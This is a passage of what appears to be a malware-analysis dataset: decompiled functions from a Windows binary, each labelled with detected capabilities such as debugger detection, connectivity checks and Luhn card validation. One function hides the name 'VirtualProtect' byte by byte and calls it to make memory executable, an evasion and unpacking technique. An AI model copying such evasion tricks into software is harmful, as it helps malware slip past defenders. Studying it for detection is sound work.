bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x00416722:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x41b1f4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00416936:\n    var_20h = iVar12 << (0x1fU - *0x41b1f4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x41b1f8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x41b1f8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3677
    },
    "00416979": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00416c3b)\n// WARNING: Removing unreachable block (ram,0x00416c04)\n// WARNING: Removing unreachable block (ram,0x00416fec)\n// WARNING: Removing unreachable block (ram,0x00416c13)\n// WARNING: Removing unreachable block (ram,0x00416c1b)\n// WARNING: Removing unreachable block (ram,0x00416c21)\n// WARNING: Removing unreachable block (ram,0x00416c24)\n// WARNING: Removing unreachable block (ram,0x00416c2b)\n// WARNING: Removing unreachable block (ram,0x00416c35)\n// WARNING: Removing unreachable block (ram,0x00416c90)\n// WARNING: Removing unreachable block (ram,0x00416c8a)\n// WARNING: Removing unreachable block (ram,0x00416c96)\n// WARNING: Removing unreachable block (ram,0x00416cb3)\n// WARNING: Removing unreachable block (ram,0x00416cb5)\n// WARNING: Removing unreachable block (ram,0x00416cbd)\n// WARNING: Removing unreachable block (ram,0x00416cc0)\n// WARNING: Removing unreachable block (ram,0x00416cc5)\n// WARNING: Removing unreachable block (ram,0x00416cc8)\n// WARNING: Removing unreachable block (ram,0x00416ff5)\n// WARNING: Removing unreachable block (ram,0x00416cd3)\n// WARNING: Removing unreachable block (ram,0x0041700c)\n// WARNING: Removing unreachable block (ram,0x00417013)\n// WARNING: Removing unreachable block (ram,0x00416cde)\n// WARNING: Removing unreachable block (ram,0x00416cf1)\n// WARNING: Removing unreachable block (ram,0x00416cf3)\n// WARNING: Removing unreachable block (ram,0x00416d00)\n// WARNING: Removing unreachable block (ram,0x00416d05)\n// WARNING: Removing unreachable block (ram,0x00416d0b)\n// WARNING: Removing unreachable block (ram,0x00416d14)\n// WARNING: Removing unreachable block (ram,0x00416d1b)\n// WARNING: Removing unreachable block (ram,0x00416d33)\n// WARNING: Removing unreachable block (ram,0x00416d44)\n// WARNING: Removing unreachable block (ram,0x00416d52)\n// WARNING: Removing unreachable block (ram,0x00416d91)\n// WARNING: Removing unreachable block (ram,0x00416d9a)\n// WARNING: Removing unreachable block (ram,0x00416fb2)\n// WARNING: Removing unreachable block (ram,0x00416da8)\n// WARNING: Removing unreachable block (ram,0x00416db2)\n// WARNING: Removing unreachable block (ram,0x00416fcd)\n// WARNING: Removing unreachable block (ram,0x00416dbf)\n// WARNING: Removing unreachable block (ram,0x00416dc6)\n// WARNING: Removing unreachable block (ram,0x00416dd0)\n// WARNING: Removing unreachable block (ram,0x00416dd5)\n// WARNING: Removing unreachable block (ram,0x00416de5)\n// WARNING: Removing unreachable block (ram,0x00416dea)\n// WARNING: Removing unreachable block (ram,0x00416df4)\n// WARNING: Removing unreachable block (ram,0x00416df9)\n// WARNING: Removing unreachable block (ram,0x00416e0b)\n// WARNING: Removing unreachable block (ram,0x00416e18)\n// WARNING: Removing unreachable block (ram,0x00416e27)\n// WARNING: Removing unreachable block (ram,0x00416e34)\n// WARNING: Removing unreachable block (ram,0x00416e51)\n// WARNING: Removing unreachable block (ram,0x00416e55)\n// WARNING: Removing unreachable block (ram,0x00416e5c)\n// WARNING: Removing unreachable block (ram,0x00416e65)\n// WARNING: Removing unreachable block (ram,0x00416e68)\n// WARNING: Removing unreachable block (ram,0x00416e79)\n// WARNING: Removing unreachable block (ram,0x00416e87)\n// WARNING: Removing unreachable block (ram,0x00416e92)\n// WARNING: Removing unreachable block (ram,0x00416e99)\n// WARNING: Removing unreachable block (ram,0x00416ec4)\n// WARNING: Removing unreachable block (ram,0x00416ec9)\n// WARNING: Removing unreachable block (ram,0x00416ed4)\n// WARNING: Removing unreachable block (ram,0x00416edd)\n// WARNING: Removing unreachable block (ram,0x00416ee3)\n// WARNING: Removing unreachable block (ram,0x00416ee6)\n// WARNING: Removing unreachable block (ram,0x00416f0c)\n// WARNING: Removing unreachable block (ram,0x00416f11)\n// WARNING: Removing unreachable block (ram,0x00416f16)\n// WARNING: Removing unreachable block (ram,0x00416f23)\n// WARNING: Removing unreachable block (ram,0x00416f34)\n// WARNING: Removing unreachable block (ram,0x00416f65)\n// WARNING: Removing unreachable block (ram,0x00416f3a)\n// WARNING: Removing unreachable block (ram,0x00416f60)\n// WARNING: Removing unreachable block (ram,0x00416f44)\n// WARNING: Removing unreachable block (ram,0x00416f5a)\n// WARNING: Removing unreachable block (ram,0x00416f53)\n// WARNING: Removing unreachable block (ram,0x00416f68)\n// WARNING: Removing unreachable block (ram,0x00416f95)\n// WARNING: Removing unreachable block (ram,0x00416f72)\n// WARNING: Removing unreachable block (ram,0x00416dfd)\n// WARNING: Removing unreachable block (ram,0x00416dda)\n// WARNING: Removing unreachable block (ram,0x00416fd0)\n// WARNING: Removing unreachable block (ram,0x00416d16)\n// WARNING: Removing unreachable block (ram,0x00416fda)\n// WARNING: Removing unreachable block (ram,0x0041701b)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.00416979(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.004081c4();\n        *puVar2 = 0x16;\n        fcn.0040815c(0, 0, 0, 0, 0);\n        fcn.00407c7b(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x00416a0c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x417041\n    (**0x417041)();\n    return;\n}\n",
        "token_count": 1831
    },
    "00406630": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406630(uint32_t arg_8h)\n\n{\n    fcn.0040660d();\n    if ((arg_8h & 1) != 0) {\n        fcn.00407033();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "00407279": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407279(uint32_t arg_8h)\n\n{\n    fcn.00407269();\n    if ((arg_8h & 1) != 0) {\n        fcn.00407033();\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "0040b379": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040b379(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b4(0x418390, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004081d7();\n        *puVar2 = 0;\n        puVar2 = fcn.004081c4();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x5cc7cc)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x5cc7e0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00412049(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004081c4();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004081d7();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040ac46(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040b44b(0x418390);\n                goto code_r0x0040b445;\n            }\n        }\n        puVar2 = fcn.004081d7();\n        *puVar2 = 0;\n        puVar2 = fcn.004081c4();\n        *puVar2 = 9;\n        fcn.0040815c(0, 0, 0, 0, 0);\n    }\ncode_r0x0040b445:\n    fcn.004092f9();\n    return;\n}\n",
        "token_count": 633
    },
    "0040e1ca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e1ca(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b4(0x4183f0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004081d7();\n        *puVar2 = 0;\n        puVar2 = fcn.004081c4();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x5cc7cc)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x5cc7e0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00412049(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004081c4();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004081d7();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040e155(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040e29c(0x4183f0);\n                goto code_r0x0040e296;\n            }\n        }\n        puVar2 = fcn.004081d7();\n        *puVar2 = 0;\n        puVar2 = fcn.004081c4();\n        *puVar2 = 9;\n        fcn.0040815c(0, 0, 0, 0, 0);\n    }\ncode_r0x0040e296:\n    fcn.004092f9();\n    return;\n}\n",
        "token_count": 638
    },
    "0040fc0a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fc0a(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x401d90;\n    fcn.0040660d();\n    if ((arg_8h & 1) != 0) {\n        fcn.00407033();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0040680b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040680b(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b4(0x418170, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.004081c4();\n        *puVar3 = 0x16;\n        fcn.0040815c(0, 0, 0, 0, 0);\n        goto code_r0x00406906;\n    }\n    fcn.00409573(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.00409a09(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x41a558;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x5cc7e0);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x41a558;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x5cc7e0);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x004068d1;\n        }\n        puVar3 = fcn.004081c4();\n        *puVar3 = 0x16;\n        fcn.0040815c(0, 0, 0, 0, 0);\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x004068d1:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.00409651(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040690f();\ncode_r0x00406906:\n    fcn.004092f9();\n    return;\n}\n",
        "token_count": 830
    },
    "00412d89": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17",
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.00412d89(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint32_t *unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_ESI) {\n        if (*(unaff_EBP + -0x20) != unaff_ESI) {\n            puVar1 = *((*unaff_EDI >> 5) * 4 + 0x5cc7e0) + 4 + (*unaff_EDI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.004120e9(*unaff_EDI);\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0040dbc5": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040dbc5(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 92
    },
    "00404e6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404e6b(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 47
    },
    "00404e72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404e72(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "004050bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004050bb(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 23
    },
    "004050d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004050d5(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *0x5cb4f0 = 0x56;\n    *0x5cb4f1 = 0x69;\n    *0x5cb4f2 = 0x72;\n    *0x5cb4f7 = 0x50;\n    *0x5cb4fd = 0x74;\n    *0x5cb4fe = 0;\n    *0x5cb4f3 = 0x74;\n    *0x5cb4f4 = 0x75;\n    *0x5cb4f5 = 0x61;\n    *0x5cb4f6 = 0x6c;\n    *0x5cb4f8 = 0x72;\n    *0x5cb4f9 = 0x6f;\n    *0x5cb4fa = 0x74;\n    *0x5cb4fb = 0x65;\n    *0x5cb4fc = 99;\n    *0x5cc580 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x5cc58c, 0x5cb4f0);\n    var_4h = 0x40;\n    (**0x5cc580)(*0x5cc588, *0x5cc7bc, 0x40, &var_8h);\n    return;\n}\n",
        "token_count": 328
    },
    "0040653e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040653e(void)\n\n{\n    int32_t in_EAX;\n    \n    if (7 < *(in_EAX + 0x18)) {\n        return *(in_EAX + 4);\n    }\n    return in_EAX + 4;\n}\n",
        "token_count": 61
    },
    "00406f6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00406f6e(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.004092b4(0x418218, 0xc);\n    if (*(unaff_EBP + 8) == 0) {\n        puVar1 = fcn.004081c4();\n        *puVar1 = 0x16;\n        fcn.0040815c(0, 0, 0, 0, 0);\n    }\n    else {\n        iVar2 = fcn.0040949c();\n        fcn.004095b4(1, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0040949c();\n        arg_8h_00 = fcn.0040c927(iVar2 + 0x20);\n        iVar2 = unaff_EBP + 0xc;\n        arg_10h = 0;\n        uVar4 = *(unaff_EBP + 8);\n        iVar3 = fcn.0040949c();\n        uVar4 = fcn.0040ca9d(iVar3 + 0x20, uVar4, arg_10h, iVar2);\n        *(unaff_EBP + -0x1c) = uVar4;\n        iVar2 = fcn.0040949c();\n        fcn.0040c9c3(arg_8h_00, iVar2 + 0x20);\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040700a();\n    }\n    fcn.004092f9();\n    return;\n}\n",
        "token_count": 466
    },
    "0040700a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040700a(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040949c();\n    fcn.00409622(1, iVar1 + 0x20);\n    return;\n}\n",
        "token_count": 54
    },
    "0040755a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040755a(uint arg_8h)\n\n{\n    fcn.0040742e(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0040d65e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d902)\n\nfloat10 fcn.0040d65e(double param_1)\n\n{\n    int32_t iVar1;\n    double dVar2;\n    double dVar3;\n    int32_t iVar4;\n    double dVar5;\n    double dVar6;\n    uchar auVar7 [16];\n    double dVar8;\n    double in_XMM7_Qa;\n    \n    dVar2 = in_XMM7_Qa & *0x401b00;\n    dVar3 = in_XMM7_Qa & *0x401b08;\n    if (*0x401c28 <= dVar2) {\n        return *0x401c38 + *((param_1._4_4_ >> 0x1f) * -8 + 0x401b10);\n    }\n    if (*0x401c18 <= dVar2) {\n        if (*0x401c10 <= dVar2) {\n            if (*0x401c08 <= dVar2) {\n                iVar1 = 0x300;\n                dVar3 = *0x401bf0 / dVar2;\n            }\n            else {\n                iVar4 = (dVar2 + *0x401c00 >> 0x2c) - *0x401be0;\n                iVar1 = iVar4 * 3;\n                dVar3 = *(iVar4 * 0x18 + 0x4027d0);\n                dVar3 = (dVar2 - dVar3) / (dVar2 * dVar3 + *0x401bf8);\n            }\n            dVar5 = dVar3 * dVar3;\n            dVar6 = dVar5 * dVar5;\n            dVar8 = dVar3 * dVar3 * dVar3 * dVar3;\n            dVar5 = (((*0x401bd0 * dVar6 + *0x401bc0) * dVar6 + *0x401bb0) * dVar6 + *0x401ba0) * dVar5;\n            auVar7 = CONCAT88(((*0x401bd8 * dVar8 + *0x401bc8) * dVar8 + *0x401bb8) * dVar8 + *0x401ba8, dVar5);\n            auVar7 = shufpd(auVar7, auVar7, 1);\n            return *(iVar1 * 8 + 0x4027c0) - (((dVar5 + SUB168(auVar7, 0)) * dVar3 - *(iVar1 * 8 + 0x4027c8)) - dVar3) |\n                   in_XMM7_Qa ^ dVar2;\n        }\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((((((*0x401b90 * dVar5 + *0x401b80) * dVar5 + *0x401b70) * dVar5 + *0x401b60) * dVar5 + *0x401b50) *\n                   dVar5 + *0x401b40) * dVar5 + *0x401b30) * dVar5 + *0x401b20) * dVar2;\n        auVar7 = CONCAT88(((((((*0x401b98 * dVar3 + *0x401b88) * dVar3 + *0x401b78) * dVar3 + *0x401b68) * dVar3 +\n                            *0x401b58) * dVar3 + *0x401b48) * dVar3 + *0x401b38) * dVar3 + *0x401b28, dVar2);\n        auVar7 = shufpd(auVar7, auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (*0x401c20 <= dVar2) {\n        dVar2 = dVar2 * dVar2;\n        dVar5 = dVar2 * dVar2;\n        dVar3 = dVar3 * dVar3 * dVar3 * dVar3;\n        dVar2 = (((*0x401bd0 * dVar5 + *0x401bc0) * dVar5 + *0x401bb0) * dVar5 + *0x401ba0) * dVar2;\n        auVar7 = CONCAT88(((*0x401bd8 * dVar3 + *0x401bc8) * dVar3 + *0x401bb8) * dVar3 + *0x401ba8, dVar2);\n        auVar7 = shufpd(auVar7, auVar7, 1);\n        return in_XMM7_Qa - (dVar2 + SUB168(auVar7, 0)) * in_XMM7_Qa;\n    }\n    if (dVar2 != *0x401be8) {\n        if (*0x401c30 <= dVar2) {\n            return *0x401c38 * *0x401c38 + param_1;\n        }\n        return *0x401c38 * *0x401c38 + param_1;\n    }\n    return param_1;\n}\n",
        "token_count": 1209
    },
    "0040efdf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040eff3)\n// WARNING: Removing unreachable block (ram,0x0040eff9)\n// WARNING: Removing unreachable block (ram,0x0040effb)\n\nvoid fcn.0040efdf(void)\n\n{\n    return;\n}\n",
        "token_count": 64
    },
    "00412ceb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412ceb(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b4(0x4186f8, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.004081c4();\n        *puVar1 = 0x16;\n        fcn.0040815c(0, 0, 0, 0, 0);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.004125cc(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.00412d89();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.004092f9();\n    return;\n}\n",
        "token_count": 454
    },
    "00412db7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412db7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.00412ceb(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 77
    },
    "004157d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004157d9(uint *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (arg_8h == NULL) {\n        puVar1 = fcn.004081c4();\n        *puVar1 = 0x16;\n        fcn.0040815c(0, 0, 0, 0, 0);\n        uVar2 = 0x16;\n    }\n    else {\n        *arg_8h = *0x5cb4ec;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 138
    },
    "00414c7c": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00414c7c(void)\n\n{\n    *0x41b054 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x404768, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 64
    },
    "0040e443": {
        "rules": [
            "contain loop"
        ],
